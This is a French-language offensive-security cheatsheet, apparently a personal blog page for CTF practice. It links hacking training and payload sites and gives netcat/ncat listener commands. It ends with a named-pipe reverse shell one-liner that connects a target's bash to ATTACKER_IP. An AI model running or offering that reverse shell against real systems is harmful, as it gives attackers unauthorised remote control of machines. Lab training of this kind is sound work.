---
name: Boîte à outils
tools: [Cheatsheet]
image: "https://cdn.pixabay.com/photo/2014/04/02/16/18/toolbox-306888_960_720.png"
description: Les outils et commandes les plus utiles
---

# Boîte à outils <!-- omit in toc -->

## Sommaire <!-- omit in toc -->

* [1. Site web](#1-site-web)
* [2. Commandes](#2-commandes)
  * [2.1 Côté machine d'attaque](#21-côté-machine-dattaque)
    * [2.1.1 Mise en écoute](#211-mise-en-écoute)
  * [2.2 Côté cible](#22-côté-cible)
    * [2.2.1 Pipe reverse shell](#221-pipe-reverse-shell)

## 1. Site web

1. [TryHackMe](https://tryhackme.com/) : Formations et exercices de cybersécurité
2. [HackTheBox](https://www.hackthebox.com/) : Formations et exercices de cybersécurité (aspect compétitif)
3. [GTFOBins](https://gtfobins.github.io/) : Techniques d'élévation de privilèges en exploitant les failles des binaires Linux
4. [LOLBAS](https://lolbas-project.github.io/#) : Equivalent de GTFOBins pour Windows
5. [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/) : Recueil de nombreuses charges permettant d'exploiter des vulnérabilités
6. [ExploitDB](https://www.exploit-db.com/) : Base recensant des vulnérabilités et les moyens de les exploiter
7. [CyberChef](https://gchq.github.io/CyberChef/) : Manipulation de données, chiffrement, déchiffrement

## 2. Commandes

### 2.1 Côté machine d'attaque

#### 2.1.1 Mise en écoute

##### 2.1.1.1 Plus simple, préinstallé : Netcat

```bash
netcat -lvnp 9000
# ou
nc -lvnp 9000
```

> * `-l` : mode écoute (*listen*)
> * `-n` : pas de résolution DNS
> * `-v` : mode verbeux
> * `-p` : pour spécifier le port

##### 2.1.1.2 Netcat amélioré : Ncat

Développé et distribué par l'équipe en charge de l'outil Nmap, `ncat` intègre notamment le SSL pour interagir avec des shells chiffrés.

```bash
ncat -lvnp 9000
```

##### 2.1.1.3 Activer l'historique de commandes

Par défaut, Netcat, quelque soit la version citée plus haut, ne permet pas d'utiliser les commandes précédentes avec la flèche du haut, contrairement au shell Linux de base.

```bash
rlwrap nc -lvnp 9000
```

Pour ma part, j'ai créé un alias pour utiliser rapidement la mise en écoute la plus complète possible :

```bash
alias nc='rlwrap ncat'
```

### 2.2 Côté cible

#### 2.2.1 Pipe reverse shell

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```
